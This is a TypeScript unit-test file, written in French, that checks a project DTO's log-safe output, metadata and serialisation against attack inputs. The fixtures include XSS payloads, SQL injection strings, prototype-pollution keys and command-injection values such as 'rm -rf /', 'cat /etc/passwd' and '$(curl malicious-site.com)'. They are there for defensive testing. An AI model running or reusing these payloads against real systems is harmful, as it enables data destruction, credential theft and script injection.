// test/unit/project/dto/project-response.dto.security.spec.ts

import { plainToInstance, instanceToPlain } from 'class-transformer';
import {
  ProjectResponseDto,
  StatisticsResponseDto,
} from '../../../../src/project/dto/project-response.dto';
import { ProjectStatus } from '../../../../src/common/enums/project-status.enum';

describe('ProjectResponseDto - Tests de Sécurité', () => {
  // ========================================================================
  // FIXTURES POUR LES TESTS DE SÉCURITÉ
  // ========================================================================

  const createValidStatisticsData = () => ({
    costs: {
      claudeApi: 0.45,
      storage: 0.02,
      compute: 0.01,
      total: 0.48,
    },
    performance: {
      generationTime: 12500,
      processingTime: 2300,
      totalTime: 14800,
    },
    usage: {
      documentsGenerated: 5,
      filesProcessed: 3,
      tokensUsed: 1250,
    },
    lastUpdated: new Date('2024-08-08T14:30:00Z'),
  });

  const createValidProjectData = () => ({
    id: '550e8400-e29b-41d4-a716-446655440000',
    name: 'Test Project',
    description: 'A test project description',
    initialPrompt: 'Create a simple web application with user authentication',
    status: ProjectStatus.ACTIVE,
    uploadedFileIds: ['file1-uuid', 'file2-uuid'],
    generatedFileIds: ['gen1-uuid', 'gen2-uuid', 'gen3-uuid'],
    createdAt: new Date('2024-08-08T10:30:00Z'),
    updatedAt: new Date('2024-08-08T14:30:00Z'),
    statistics: createValidStatisticsData(),
  });

  const createSensitiveProjectData = () => ({
    ...createValidProjectData(),
    name: 'Projet Secret Defense',
    description:
      'Information confidentielle client XYZ avec données personnelles',
    initialPrompt:
      'Créer un système pour gérer les données sensibles de nos clients incluant SSN, cartes de crédit et mots de passe',
  });

  // ========================================================================
  // TESTS DE PROTECTION DES DONNÉES SENSIBLES
  // ========================================================================

  describe('Protection des données sensibles', () => {
    describe('toLogSafeString() - Aucune donnée utilisateur exposée', () => {
      it('ne devrait jamais exposer le nom du projet', () => {
        const sensitiveData = createSensitiveProjectData();
        const dto = plainToInstance(ProjectResponseDto, sensitiveData);
        const safeString = dto.toLogSafeString();

        expect(safeString).not.toContain('Secret Defense');
        expect(safeString).not.toContain('Projet Secret');
        expect(safeString).not.toContain(sensitiveData.name);
      });

      it('ne devrait jamais exposer la description du projet', () => {
        const sensitiveData = createSensitiveProjectData();
        const dto = plainToInstance(ProjectResponseDto, sensitiveData);
        const safeString = dto.toLogSafeString();

        expect(safeString).not.toContain('confidentielle');
        expect(safeString).not.toContain('client XYZ');
        expect(safeString).not.toContain('données personnelles');
        expect(safeString).not.toContain(sensitiveData.description!);
      });

      it('ne devrait jamais exposer le prompt initial', () => {
        const sensitiveData = createSensitiveProjectData();
        const dto = plainToInstance(ProjectResponseDto, sensitiveData);
        const safeString = dto.toLogSafeString();

        expect(safeString).not.toContain('données sensibles');
        expect(safeString).not.toContain('clients');
        expect(safeString).not.toContain('SSN');
        expect(safeString).not.toContain('cartes de crédit');
        expect(safeString).not.toContain('mots de passe');
        expect(safeString).not.toContain(sensitiveData.initialPrompt);
      });

      it('ne devrait jamais exposer les IDs de fichiers', () => {
        const sensitiveData = {
          ...createValidProjectData(),
          uploadedFileIds: ['secret-document-123', 'confidential-file-456'],
          generatedFileIds: ['internal-report-789', 'classified-output-999'],
        };

        const dto = plainToInstance(ProjectResponseDto, sensitiveData);
        const safeString = dto.toLogSafeString();

        expect(safeString).not.toContain('secret-document-123');
        expect(safeString).not.toContain('confidential-file-456');
        expect(safeString).not.toContain('internal-report-789');
        expect(safeString).not.toContain('classified-output-999');
      });

      it('devrait uniquement exposer des métadonnées non sensibles', () => {
        const sensitiveData = createSensitiveProjectData();
        const dto = plainToInstance(ProjectResponseDto, sensitiveData);
        const safeString = dto.toLogSafeString();

        // Vérifier que seules les métadonnées autorisées sont présentes
        expect(safeString).toContain('id=550e8400-e29b-41d4-a716-446655440000');
        expect(safeString).toContain('status=ACTIVE');
        expect(safeString).toContain('files=5');
        expect(safeString).toContain('stats=true');
        expect(safeString).toContain('complexity=high');
      });

      it('devrait gérer les données avec caractères spéciaux dangereux', () => {
        const maliciousData = {
          ...createValidProjectData(),
          name: '<script>alert("XSS")</script>',
          description: 'javascript:void(0)/* Malicious code */',
          initialPrompt: 'data:text/html,<h1>Injection attempt</h1>',
        };

        const dto = plainToInstance(ProjectResponseDto, maliciousData);
        const safeString = dto.toLogSafeString();

        expect(safeString).not.toContain('<script>');
        expect(safeString).not.toContain('javascript:');
        expect(safeString).not.toContain('data:text/html');
        expect(safeString).not.toContain('XSS');
        expect(safeString).not.toContain('Malicious');
        expect(safeString).not.toContain('Injection');
      });

      it('devrait gérer les données avec informations personnelles simulées', () => {
        const piiData = {
          ...createValidProjectData(),
          name: 'Projet John Doe',
          description: 'Email: john.doe@company.com, Phone: +33-123-456-789',
          initialPrompt:
            'Create system for user SSN 123-45-6789 and credit card 4111-1111-1111-1111',
        };

        const dto = plainToInstance(ProjectResponseDto, piiData);
        const safeString = dto.toLogSafeString();

        expect(safeString).not.toContain('John Doe');
        expect(safeString).not.toContain('john.doe@company.com');
        expect(safeString).not.toContain('+33-123-456-789');
        expect(safeString).not.toContain('123-45-6789');
        expect(safeString).not.toContain('4111-1111-1111-1111');
      });
    });

    describe('getMetadata() - Métadonnées sécurisées', () => {
      it('ne devrait pas exposer de champs sensibles', () => {
        const sensitiveData = createSensitiveProjectData();
        const dto = plainToInstance(ProjectResponseDto, sensitiveData);
        const metadata = dto.getMetadata();

        // Vérifier qu'aucun champ sensible n'est dans les métadonnées
        expect(metadata).not.toHaveProperty('name');
        expect(metadata).not.toHaveProperty('description');
        expect(metadata).not.toHaveProperty('initialPrompt');
        expect(metadata).not.toHaveProperty('uploadedFileIds');
        expect(metadata).not.toHaveProperty('generatedFileIds');
        expect(metadata).not.toHaveProperty('statistics');
      });

      it('devrait uniquement contenir des métadonnées non sensibles', () => {
        const sensitiveData = createSensitiveProjectData();
        const dto = plainToInstance(ProjectResponseDto, sensitiveData);
        const metadata = dto.getMetadata();

        // Vérifier que seules les métadonnées autorisées sont présentes
        expect(metadata).toHaveProperty('id');
        expect(metadata).toHaveProperty('status');
        expect(metadata).toHaveProperty('ageInDays');
        expect(metadata).toHaveProperty('totalFiles');
        expect(metadata).toHaveProperty('hasStatistics');
        expect(metadata).toHaveProperty('complexity');
        expect(metadata).toHaveProperty('activityLevel');

        // Vérifier que les valeurs sont des types sûrs
        expect(typeof metadata.id).toBe('string');
        expect(typeof metadata.status).toBe('string');
        expect(typeof metadata.ageInDays).toBe('number');
        expect(typeof metadata.totalFiles).toBe('number');
        expect(typeof metadata.hasStatistics).toBe('boolean');
        expect(typeof metadata.complexity).toBe('string');
        expect(typeof metadata.activityLevel).toBe('string');
      });

      it('devrait avoir des métadonnées consistantes entre appels', () => {
        const data = createValidProjectData();
        const dto = plainToInstance(ProjectResponseDto, data);

        const metadata1 = dto.getMetadata();
        const metadata2 = dto.getMetadata();

        expect(metadata1).toEqual(metadata2);
      });
    });

    describe('toString() - Gestion sécurisée des données exposées', () => {
      it("devrait limiter l'exposition des données sensibles", () => {
        const sensitiveData = createSensitiveProjectData();
        const dto = plainToInstance(ProjectResponseDto, sensitiveData);
        const result = dto.toString();

        // toString peut contenir le nom pour l'usage légitime mais pas les détails sensibles
        expect(result).toContain('Projet Secret Defense'); // Nom autorisé dans toString
        expect(result).not.toContain('confidentielle'); // Pas la description
        expect(result).not.toContain('client XYZ');
        expect(result).not.toContain('données sensibles'); // Pas le prompt
      });

      it('devrait formater les données de manière prévisible', () => {
        const data = createValidProjectData();
        const dto = plainToInstance(ProjectResponseDto, data);
        const result = dto.toString();

        // Vérifier le format attendu
        expect(result).toMatch(/^Project\[.*\]\(.*\)$/);
        expect(result).toContain('Test Project');
        expect(result).toContain('ACTIVE');
        expect(result).toContain('files=5');
      });
    });
  });

  // ========================================================================
  // TESTS DE TRANSFORMATION SÉCURISÉE
  // ========================================================================

  describe('Transformations sécurisées', () => {
    describe('Filtrage des tableaux de fichiers', () => {
      it("devrait filtrer les tentatives d'injection dans les tableaux", () => {
        const maliciousData = {
          ...createValidProjectData(),
          uploadedFileIds: [
            'valid-uuid',
            '<script>alert("xss")</script>',
            'javascript:void(0)',
            'data:text/html,<h1>Hack</h1>',
            null,
            undefined,
            'another-valid-uuid',
          ],
          generatedFileIds: [
            'valid-uuid',
            { malicious: 'object' },
            ['nested', 'array'],
            'vbscript:msgbox("attack")',
            42,
            'final-valid-uuid',
          ],
        };

        const dto = plainToInstance(ProjectResponseDto, maliciousData);

        // Vérifier que seules les chaînes valides sont conservées
        expect(dto.uploadedFileIds).toEqual([
          'valid-uuid',
          'another-valid-uuid',
        ]);
        expect(dto.generatedFileIds).toEqual([
          'valid-uuid',
          'final-valid-uuid',
        ]);

        // Vérifier qu'aucun contenu malveillant n'est présent
        const allFileIds = [
          ...dto.uploadedFileIds,
          ...dto.generatedFileIds,
        ].join('');
        expect(allFileIds).not.toContain('<script>');
        expect(allFileIds).not.toContain('javascript:');
        expect(allFileIds).not.toContain('data:');
        expect(allFileIds).not.toContain('vbscript:');
      });

      it('devrait gérer les tentatives de pollution de prototype', () => {
        const maliciousData = {
          ...createValidProjectData(),
          uploadedFileIds: [
            '__proto__',
            'constructor',
            'prototype',
            'valid-id',
          ],
          generatedFileIds: [
            'toString',
            'valueOf',
            '__defineGetter__',
            'another-valid-id',
          ],
        };

        const dto = plainToInstance(ProjectResponseDto, maliciousData);

        // Les chaînes sont conservées mais ne peuvent pas polluer le prototype
        expect(dto.uploadedFileIds).toContain('valid-id');
        expect(dto.generatedFileIds).toContain('another-valid-id');

        // Vérifier que l'objet fonctionne normalement
        expect(typeof dto.getTotalFilesCount).toBe('function');
        expect(dto.getTotalFilesCount()).toBeGreaterThan(0);
      });

      it("devrait empêcher l'injection de code via les noms de propriétés", () => {
        const maliciousData = {
          ...createValidProjectData(),
          eval: 'malicious-code',
          Function: 'constructor-injection',
          '__proto__.polluted': 'prototype-pollution',
        };

        const dto = plainToInstance(ProjectResponseDto, maliciousData);

        // Vérifier que les propriétés malveillantes ne sont pas présentes
        expect((dto as any).eval).toBeUndefined();
        expect((dto as any).Function).toBeUndefined();
        expect((dto as any).__proto__.polluted).toBeUndefined();
      });
    });

    describe('StatisticsResponseDto - Transformation sécurisée', () => {
      it('devrait sécuriser les transformations JSON des statistiques', () => {
        const maliciousStatsData = {
          costs: {
            claudeApi: 0.5,
            storage: 0.1,
            compute: 0.05,
            total: 0.65,
            maliciousField: '<script>alert("xss")</script>',
            __proto__: { polluted: 'value' },
          },
          performance: {
            generationTime: 1000,
            processingTime: 500,
            totalTime: 1500,
            'javascript:void(0)': 'malicious-key',
          },
          usage: {
            documentsGenerated: 5,
            filesProcessed: 3,
            tokensUsed: 1000,
            'eval("malicious")': 'code-injection',
          },
          lastUpdated: new Date(),
        };

        const dto = plainToInstance(StatisticsResponseDto, maliciousStatsData);

        // Vérifier que seuls les champs attendus sont présents
        expect(dto.costs).toEqual({
          claudeApi: 0.5,
          storage: 0.1,
          compute: 0.05,
          total: 0.65,
        });

        expect(dto.performance).toEqual({
          generationTime: 1000,
          processingTime: 500,
          totalTime: 1500,
        });

        expect(dto.usage).toEqual({
          documentsGenerated: 5,
          filesProcessed: 3,
          tokensUsed: 1000,
        });

        // Vérifier qu'aucun champ malveillant n'est présent
        expect(dto.costs).not.toHaveProperty('maliciousField');
        expect(dto.costs).not.toHaveProperty('__proto__');
        expect(dto.performance).not.toHaveProperty('javascript:void(0)');
        expect(dto.usage).not.toHaveProperty('eval("malicious")');
      });

      it("devrait empêcher l'injection via les valeurs de coûts", () => {
        const maliciousData = {
          costs: {
            claudeApi: 'javascript:alert(1)',
            storage: '<script>hack()</script>',
            compute: { nested: 'object' },
            total: [1, 2, 3],
          },
          performance: { generationTime: 0, processingTime: 0, totalTime: 0 },
          usage: { documentsGenerated: 0, filesProcessed: 0, tokensUsed: 0 },
          lastUpdated: new Date(),
        };

        const dto = plainToInstance(StatisticsResponseDto, maliciousData);

        // Les valeurs non-numériques devraient être converties ou rejetées
        expect(typeof dto.costs.claudeApi).toBe('number');
        expect(typeof dto.costs.storage).toBe('number');
        expect(typeof dto.costs.compute).toBe('number');
        expect(typeof dto.costs.total).toBe('number');
      });
    });

    describe('Sérialisation sécurisée', () => {
      it('ne devrait pas exposer de champs non-@Expose() lors de la sérialisation', () => {
        const dataWithHiddenFields = {
          ...createValidProjectData(),
          ownerId: 'user-123-secret',
          internalApiKey: 'sk-1234567890abcdef',
          privateNotes: 'Informations confidentielles internes',
          debugInfo: { sensitive: 'data' },
        };

        const dto = plainToInstance(ProjectResponseDto, dataWithHiddenFields);
        const json = instanceToPlain(dto, { excludeExtraneousValues: true });

        // Vérifier que les champs sensibles ne sont pas exposés
        expect(json).not.toHaveProperty('ownerId');
        expect(json).not.toHaveProperty('internalApiKey');
        expect(json).not.toHaveProperty('privateNotes');
        expect(json).not.toHaveProperty('debugInfo');

        // Vérifier que les champs autorisés sont présents
        expect(json).toHaveProperty('id');
        expect(json).toHaveProperty('name');
        expect(json).toHaveProperty('status');
      });

      it('devrait maintenir la sécurité à travers plusieurs cycles de sérialisation', () => {
        const sensitiveData = {
          ...createSensitiveProjectData(),
          hiddenField: 'should-not-appear',
          secretToken: 'very-secret-value',
        };

        // Cycle complet : Data -> DTO -> JSON -> DTO -> JSON
        const dto1 = plainToInstance(ProjectResponseDto, sensitiveData);
        const json1 = instanceToPlain(dto1, { excludeExtraneousValues: true });
        const dto2 = plainToInstance(ProjectResponseDto, json1);
        const json2 = instanceToPlain(dto2, { excludeExtraneousValues: true });

        // Vérifier qu'aucun champ sensible n'apparaît dans les JSON
        expect(json1).not.toHaveProperty('hiddenField');
        expect(json1).not.toHaveProperty('secretToken');
        expect(json2).not.toHaveProperty('hiddenField');
        expect(json2).not.toHaveProperty('secretToken');

        // Vérifier que les méthodes de sécurité fonctionnent toujours
        expect(dto2.toLogSafeString()).not.toContain('Secret Defense');
        expect(dto2.getMetadata()).not.toHaveProperty('name');
      });
    });
  });

  // ========================================================================
  // TESTS DE RÉSISTANCE AUX ATTAQUES
  // ========================================================================

  describe('Résistance aux attaques', () => {
    describe("Protection contre l'injection de code", () => {
      it("devrait résister aux tentatives d'injection JavaScript", () => {
        const jsInjectionData = {
          ...createValidProjectData(),
          name: 'alert(1); // Injection attempt',
          description: 'eval("malicious code"); console.log("hacked");',
          initialPrompt: 'Function("return process")().exit(1);',
        };

        const dto = plainToInstance(ProjectResponseDto, jsInjectionData);

        // Les données sont stockées mais les méthodes sécurisées ne les exposent pas
        expect(dto.name).toBe('alert(1); // Injection attempt');
        expect(dto.toLogSafeString()).not.toContain('alert(1)');
        expect(dto.toLogSafeString()).not.toContain('Injection attempt');
        expect(dto.getMetadata()).not.toHaveProperty('name');
      });

      it("devrait résister aux tentatives d'injection SQL (bien que non applicable)", () => {
        const sqlInjectionData = {
          ...createValidProjectData(),
          name: "'; DROP TABLE projects; --",
          description: "1' OR '1'='1",
          initialPrompt: "UNION SELECT * FROM users WHERE password = 'admin'",
        };

        const dto = plainToInstance(ProjectResponseDto, sqlInjectionData);

        // Les données sont préservées mais pas exposées dans les logs
        expect(dto.toLogSafeString()).not.toContain('DROP TABLE');
        expect(dto.toLogSafeString()).not.toContain('UNION SELECT');
        expect(dto.toLogSafeString()).not.toContain("1'='1");
      });

      it("devrait résister aux tentatives d'injection de commandes", () => {
        const commandInjectionData = {
          ...createValidProjectData(),
          name: 'test; rm -rf /',
          description: '`cat /etc/passwd`',
          initialPrompt: '$(curl malicious-site.com)',
        };

        const dto = plainToInstance(ProjectResponseDto, commandInjectionData);

        expect(dto.toLogSafeString()).not.toContain('rm -rf');
        expect(dto.toLogSafeString()).not.toContain('cat /etc/passwd');
        expect(dto.toLogSafeString()).not.toContain('curl malicious');
      });
    });

    describe("Protection contre l'injection HTML/XSS", () => {
      it('devrait résister aux attaques XSS basiques', () => {
        const xssData = {
          ...createValidProjectData(),
          name: '<img src=x onerror=alert(1)>',
          description: '<svg onload=alert(document.cookie)>',
          initialPrompt: '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        };

        const dto = plainToInstance(ProjectResponseDto, xssData);

        expect(dto.toLogSafeString()).not.toContain('<img');
        expect(dto.toLogSafeString()).not.toContain('onerror');
        expect(dto.toLogSafeString()).not.toContain('<svg');
        expect(dto.toLogSafeString()).not.toContain('onload');
        expect(dto.toLogSafeString()).not.toContain('<iframe');
        expect(dto.toLogSafeString()).not.toContain('javascript:alert');
      });

      it('devrait résister aux attaques XSS avancées', () => {
        const advancedXssData = {
          ...createValidProjectData(),
          name: 'javascript:/*-/*`/*\\`/*\'/*"/**/(/* */onerror=alert() )//',
          description:
            '</script><script>alert(String.fromCharCode(88,83,83))</script>',
          initialPrompt: '<img src="/" =_=" title="onerror=\'alert(1)\'">',
        };

        const dto = plainToInstance(ProjectResponseDto, advancedXssData);
        const safeString = dto.toLogSafeString();

        expect(safeString).not.toContain('javascript:');
        expect(safeString).not.toContain('onerror');
        expect(safeString).not.toContain('</script>');
        expect(safeString).not.toContain('<script>');
        expect(safeString).not.toContain('alert');
        expect(safeString).not.toContain('String.fromCharCode');
      });
    });

    describe('Protection contre les attaques de déni de service', () => {
      it('devrait gérer les chaînes extrêmement longues', () => {
        const longStringData = {
          ...createValidProjectData(),
          name: 'A'.repeat(1000000), // 1 million de caractères
          description: 'B'.repeat(1000000),
          initialPrompt: 'C'.repeat(1000000),
        };

        const dto = plainToInstance(ProjectResponseDto, longStringData);

        // Vérifier que les méthodes sécurisées ne plantent pas
        expect(() => dto.toLogSafeString()).not.toThrow();
        expect(() => dto.getMetadata()).not.toThrow();
        expect(() => dto.toString()).not.toThrow();

        // Vérifier que les méthodes de calcul fonctionnent toujours
        expect(() => dto.getComplexityEstimate()).not.toThrow();
        expect(() => dto.getTotalFilesCount()).not.toThrow();
      });

      it('devrait gérer les objets avec de nombreuses propriétés', () => {
        const manyPropsData = {
          ...createValidProjectData(),
        };

        // Ajouter 10000 propriétés
        for (let i = 0; i < 10000; i++) {
          (manyPropsData as any)[`prop${i}`] = `value${i}`;
        }

        const dto = plainToInstance(ProjectResponseDto, manyPropsData);

        expect(() => dto.toLogSafeString()).not.toThrow();
        expect(() =>
          instanceToPlain(dto, { excludeExtraneousValues: true }),
        ).not.toThrow();
      });
    });

    describe('Protection contre la pollution de prototype', () => {
      it('devrait empêcher la pollution via __proto__', () => {
        const protoData = {
          ...createValidProjectData(),
          '__proto__.polluted': 'true',
          '__proto__.isAdmin': 'true',
        };

        const dto = plainToInstance(ProjectResponseDto, protoData);

        // Vérifier que la pollution n'a pas eu lieu
        expect((Object.prototype as any).polluted).toBeUndefined();
        expect((Object.prototype as any).isAdmin).toBeUndefined();
        expect((dto as any).polluted).toBeUndefined();
        expect((dto as any).isAdmin).toBeUndefined();
      });

      it('devrait empêcher la pollution via constructor', () => {
        const constructorData = {
          ...createValidProjectData(),
          'constructor.prototype.polluted': 'true',
          'constructor.prototype.hack': 'function() { return "hacked"; }',
        };

        const dto = plainToInstance(ProjectResponseDto, constructorData);

        expect((ProjectResponseDto.prototype as any).polluted).toBeUndefined();
        expect((ProjectResponseDto.prototype as any).hack).toBeUndefined();
      });
    });
  });

  // ========================================================================
  // TESTS DE VALIDATION DES MÉCANISMES DE SÉCURITÉ
  // ========================================================================

  describe('Validation des mécanismes de sécurité', () => {
    describe('Intégrité des transformations', () => {
      it('les transformations @Transform ne devraient pas être bypassables', () => {
        const data = createValidProjectData();
        const dto = plainToInstance(ProjectResponseDto, data);

        // Tentative de modification directe
        (dto as any).uploadedFileIds = ['malicious-id', '<script>', null];

        // Les méthodes utilisant les transformations devraient toujours fonctionner
        expect(dto.hasUploadedFiles()).toBe(true);
        expect(dto.getTotalFilesCount()).toBeGreaterThan(0);

        // La sérialisation devrait appliquer les transformations
        const json = instanceToPlain(dto, { excludeExtraneousValues: true });
        expect(Array.isArray(json.uploadedFileIds)).toBe(true);
      });

      it('devrait maintenir la sécurité après transformation cyclique', () => {
        const sensitiveData = createSensitiveProjectData();

        // Cycle complet avec transformations
        const dto1 = plainToInstance(ProjectResponseDto, sensitiveData);
        const json1 = instanceToPlain(dto1, { excludeExtraneousValues: true });
        const dto2 = plainToInstance(ProjectResponseDto, json1);
        const json2 = instanceToPlain(dto2, { excludeExtraneousValues: true });
        const dto3 = plainToInstance(ProjectResponseDto, json2);

        // La sécurité doit être maintenue à chaque étape
        expect(dto1.toLogSafeString()).not.toContain('Secret Defense');
        expect(dto2.toLogSafeString()).not.toContain('Secret Defense');
        expect(dto3.toLogSafeString()).not.toContain('Secret Defense');

        expect(json1).not.toHaveProperty('ownerId');
        expect(json2).not.toHaveProperty('ownerId');
      });
    });

    describe("Validation de l'isolation des données", () => {
      it('devrait isoler les données entre instances', () => {
        const publicData = createValidProjectData();
        const sensitiveData = createSensitiveProjectData();

        const publicDto = plainToInstance(ProjectResponseDto, publicData);
        const sensitiveDto = plainToInstance(ProjectResponseDto, sensitiveData);

        // Vérifier que les données ne fuient pas entre instances
        expect(publicDto.name).toBe('Test Project');
        expect(sensitiveDto.name).toBe('Projet Secret Defense');

        expect(publicDto.toLogSafeString()).not.toContain('Secret Defense');
        expect(sensitiveDto.toLogSafeString()).not.toContain('Test Project');
      });

      it("devrait maintenir l'isolation lors de modifications", () => {
        const data1 = createValidProjectData();
        const data2 = createSensitiveProjectData();

        const dto1 = plainToInstance(ProjectResponseDto, data1);
        const dto2 = plainToInstance(ProjectResponseDto, data2);

        // Modifier une instance ne devrait pas affecter l'autre
        (dto1 as any).name = 'Modified Project';

        expect(dto1.name).toBe('Test Project'); // Immutable
        expect(dto2.name).toBe('Projet Secret Defense'); // Non affecté
      });
    });

    describe('Validation des logs de sécurité', () => {
      it('devrait produire des logs cohérents et sécurisés', () => {
        const data = createSensitiveProjectData();
        const dto = plainToInstance(ProjectResponseDto, data);

        // Appeler plusieurs fois pour vérifier la cohérence
        const log1 = dto.toLogSafeString();
        const log2 = dto.toLogSafeString();
        const log3 = dto.toLogSafeString();

        expect(log1).toBe(log2);
        expect(log2).toBe(log3);

        // Vérifier que tous sont sécurisés
        [log1, log2, log3].forEach((log) => {
          expect(log).not.toContain('Secret Defense');
          expect(log).not.toContain('confidentielle');
          expect(log).toContain('id=550e8400-e29b-41d4-a716-446655440000');
        });
      });

      it('devrait utiliser un format de log sécurisé standardisé', () => {
        const data = createValidProjectData();
        const dto = plainToInstance(ProjectResponseDto, data);
        const log = dto.toLogSafeString();

        // Vérifier le format attendu
        expect(log).toMatch(
          /^Project\[id=[a-f0-9-]+, status=\w+, age=\d+d, files=\d+, stats=(true|false), complexity=\w+\]$/,
        );
      });
    });
  });
});
